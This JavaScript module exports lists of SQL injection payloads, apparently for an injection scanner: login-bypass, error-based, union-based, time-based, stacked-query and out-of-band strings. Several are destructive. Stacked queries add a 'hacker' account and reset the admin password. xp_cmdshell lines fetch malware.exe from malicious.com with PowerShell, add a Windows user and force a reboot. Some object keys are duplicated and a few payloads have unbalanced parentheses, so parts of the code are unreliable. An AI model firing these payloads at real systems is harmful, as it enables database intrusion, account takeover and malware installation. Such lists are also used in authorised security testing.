const sqlPayloads = {
    bypassBassed: {
        1: '\' || 1=\'1',
        2: '" || 1="1',
        3: '") || 1=")1',
        4: '\') || 1=\')1',
        5: '\' || username="admin" -- ',
        5: '\') || username="admin" -- ',
        5: '") || username="admin" -- ',
        6: '" || username="admin" -- ',
        7: '\' || 1=\'1 # ',
        8: '" || 1="1 # ',
        9: '") || 1=")1 # ',
        10: '\') || 1=\')1 # ',
    },
    errorBased: {
        1: '(select 1 && row(1,1)>(select count(*),concat(CONCAT(\"SQLi Found\"),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))',
        2: '+(select 1 && row(1,1)>(select count(*),concat(CONCAT(\"SQLi Found\"),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+',
        3: '") && updatexml(rand(),concat(CHAR(126),\"SQLi Found\",CHAR(126)),null) - ',
        4: '\') && updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),\"SQLi Found\",null)))) -- ',
        5: '\' && updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),\"SQLi Found\",1)),null)))) -- ',
        6: '" && updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),\"SQLi Found\",1)),null) -- ',
        7: '\') && updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),\"SQLi Found\",null) -- ',
        8: '") && extractvalue(rand(),concat(CHAR(126),\"SQLi Found\",CHAR(126))) -- ',
        9: '\' && extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),\"SQLi Found\")))) -- ',
        10: '" && extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),\"SQLi Found\",CHAR(126)),1))) -- ',
        11: '\') && extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),\"SQLi Found\",CHAR(126)),1))) -- ',
        12: '") && extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),\"SQLi Found\",CHAR(126)),1))) -- ',
        13: '\' && (SELECT * FROM (SELECT NAME_CONST(\"SQLi Found\",1),NAME_CONST(\"SQLi Found\",1)) as x) -- ',
        14: '" && (SELECT * FROM (SELECT NAME_CONST(\"SQLi Found\",1),NAME_CONST(\"SQLi Found\",1)) as x) -- ',
        15: '\') && (SELECT * FROM (SELECT NAME_CONST(\"SQLi Found\",1),NAME_CONST(\"SQLi Found\",1)) as x) -- ',
        16: "1%af'AND EXTRACTVALUE(0, CONCAT(0, (SELECT DATABASE()))) --+",
        17: "1%af\"AND EXTRACTVALUE(0, CONCAT(0, (SELECT DATABASE()))) --+",
        18: "1%af') AND EXTRACTVALUE(0, CONCAT(0, (SELECT DATABASE()))) --+",
        19: "1%af\")AND EXTRACTVALUE(0, CONCAT(0, (SELECT DATABASE()))) --+",
        20: "0'||EXTRACTVALUE(0,CONCAT(0,(DATABASE())))||''='",
        21: "0\"||EXTRACTVALUE(0,CONCAT(0,(DATABASE())))||''='",
        22: "0')||EXTRACTVALUE(0,CONCAT(0,(DATABASE())))||''='",
        23: "0\")||EXTRACTVALUE(0,CONCAT(0,(DATABASE())))||''='",
    },
    unionBased: {
        1: 'UNION ALL SELECT "SQLi Found"--',
        2: 'UNION ALL SELECT "SQLi Found","SQLi Found"--',
        3: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found"--',
        4: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        5: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        6: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        7: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        8: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        9: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        10: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        11: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        12: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        13: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        14: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        15: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        16: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        17: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        18: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        19: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        20: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        21: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        22: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        23: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        24: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        25: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        26: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        27: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        28: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        29: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--',
        30: 'UNION ALL SELECT "SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found","SQLi Found"--'
    },
    stackedQueries: {
      2: "'; INSERT INTO users (username, password) VALUES (\'hacker\', \'pass123\'); SELECT * FROM users WHERE username='hacker' -- ",
      3: "'; UPDATE users SET password='newpass' WHERE username='admin' -- ",
      4: "'; SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>' || (SELECT username FROM users WHERE rownum=1) || '</root>'), '/root') FROM dual -- ",
      5: "'; SELECT ALL(SELECT username FROM users WHERE rownum=1) FROM dual -- ",
    },
    outOfBand: {
      1: '"; EXEC xp_cmdshell(\'nslookup your-malicious-domain.com\') -- ',
      2: '"; EXEC xp_cmdshell(\'powershell.exe -c "Invoke-WebRequest -Uri http://malicious.com/malware.exe -OutFile C:\\temp\\malware.exe"\') -- ',
      3: '"; EXEC xp_cmdshell(\'copy C:\\important.txt D:\\backup\\important.txt\') -- ',
      4: '"; EXEC xp_cmdshell(\'net user hacker Pass123 /add\') -- ',
      5: '"; EXEC xp_cmdshell(\'shutdown /r /t 0\') -- ',
    },
  };

const timePayloads = {
    1: "sleep(5) # ",
    2: "1 || sleep(5) # ",
    3: "\" || sleep(5) # ",
    4: "' || sleep(5) # ",
    5: "\" || sleep(5) = \" ",
    6: "' || sleep(5) = ' ",
    7: "1) || sleep(5) # ",
    8: "\") || sleep(5) = \" ",
    9: "') || sleep(5) = ' ",
    10: "1)) || sleep(5) # ",
    11: "\")) || sleep(5) = \" ",
    12: "\")) || sleep(5) = \" ",
    13: "\"))) || sleep(5) = \" # ",
    14: "\"))) || sleep(5) = \" # ",
    15: "\"); waitfor delay '0:0:5' -- ",
    16: "); waitfor delay '0:0:5' -- ",
    17: "'; waitfor delay '0:0:5' -- ",
    18: '"; waitfor delay \'0:0:5\' -- ',
    19: "'); waitfor delay '0:0:5' -- ",
    20: '"); waitfor delay \'0:0:5\' -- ',
    21: "'))); waitfor delay '0:0:5' -- ",
    22: '"))); waitfor delay \'0:0:5\' -- ',
    23: "benchmark(10000000, MD5(1)) # ",
    24: "1 || benchmark(10000000, MD5(1)) # ",
    25: "\" || benchmark(10000000, MD5(1)) # ",
    26: "' || benchmark(10000000, MD5(1)) # ",
    27: "1) || benchmark(10000000, MD5(1)) # ",
    28: "\") || benchmark(10000000, MD5(1)) # ",
    29: "') || benchmark(10000000, MD5(1)) # ",
    30: "1)) || benchmark(10000000, MD5(1)) # ",
    31: "\")) || benchmark(10000000, MD5(1)) # ",
    32: "\")) || benchmark(10000000, MD5(1)) # ",
    33: "\"))) || benchmark(10000000, MD5(1)) # ",
    34: "pg_sleep(5) -- ",
    35: "1 || pg_sleep(5) -- ",
    36: "\" || pg_sleep(5) -- ",
    37: "' || pg_sleep(5) -- ",
    38: "1) || pg_sleep(5) -- ",
    39: "\") || pg_sleep(5) -- ",
    40: "') || pg_sleep(5) -- ",
    41: "1)) || pg_sleep(5) -- ",
    42: "\")) || pg_sleep(5) -- ",
    43: "\")) || pg_sleep(5) -- ",
    44: "\"))) || pg_sleep(5) -- ",
    45: " && (SELECT * FROM (SELECT(SLEEP(5)))bAKL) && 'vRxe' = 'vRxe ",
    46: " && (SELECT * FROM (SELECT(SLEEP(5)))YjoC) && '%' = ' ",
    47: " && (SELECT * FROM (SELECT(SLEEP(5)))nQIP) ",
    48: " && (SELECT * FROM (SELECT(SLEEP(5)))nQIP) -- ",
    49: " && (SELECT * FROM (SELECT(SLEEP(5)))nQIP) # ",
    50: "SLEEP(5) # ",
    51: "SLEEP(5) -- ",
    52: "SLEEP(5) = \" ",
    53: "SLEEP(5) = ' ",
    54: "or SLEEP(5) ",
    55: "or SLEEP(5) # ",
    56: "or SLEEP(5) -- ",
    57: "or SLEEP(5) = \" ",
    58: "or SLEEP(5) = ' ",
    59: "waitfor delay '00:00:05' ",
    60: "waitfor delay '00:00:05' -- ",
    61: "waitfor delay '00:00:05' # ",
    62: "benchmark(50000000, MD5(1)) ",
    63: "benchmark(50000000, MD5(1)) -- ",
    64: "benchmark(50000000, MD5(1)) # ",
    65: "or benchmark(50000000, MD5(1)) ",
    66: "or benchmark(50000000, MD5(1)) -- ",
    67: "or benchmark(50000000, MD5(1)) # ",
    68: "pg_SLEEP(5) ",
    69: "pg_SLEEP(5) -- ",
    70: "pg_SLEEP(5) # ",
    71: "or pg_SLEEP(5) ",
    72: "or pg_SLEEP(5) -- ",
    73: "or pg_SLEEP(5) # ",
    74: "' \" ",
    75: " && SLEEP(5) ",
    76: " && SLEEP(5) -- ",
    77: " && SLEEP(5) # ",
    78: "&& SLEEP(5) ",
    79: "&& SLEEP(5) -- ",
    80: "&& SLEEP(5) # ",
    81: "' && SLEEP(5) && '1 ",
    82: "' && SLEEP(5) && '1 ",
    83: "ORDER BY SLEEP(5) ",
    84: "ORDER BY SLEEP(5) -- ",
    85: "ORDER BY SLEEP(5) # ",
    86: "(SELECT * FROM (SELECT(SLEEP(5)))ecMj) ",
    87: "(SELECT * FROM (SELECT(SLEEP(5)))ecMj) # ",
    88: "(SELECT * FROM (SELECT(SLEEP(5)))ecMj) -- ",
    89: "+benchmark(3200, SHA1(1)) + ' ",
    90: "+ SLEEP(10) + ' ",
    91: "RANDOMBLOB(500000000/2) ",
    92: " && 2947 = LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2)))) ",
    93: "OR 2947 = LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2)))) ",
    94: "RANDOMBLOB(1000000000/2) ",
    95: " && 2947 = LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(1000000000/2)))) ",
    96: "OR 2947 = LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(1000000000/2)))) ",
    97: "SLEEP(1) /* ' || SLEEP(1) || ' \" || SLEEP(1) || ' ",
}

module.exports = {
    sqlPayloads,
    timePayloads
};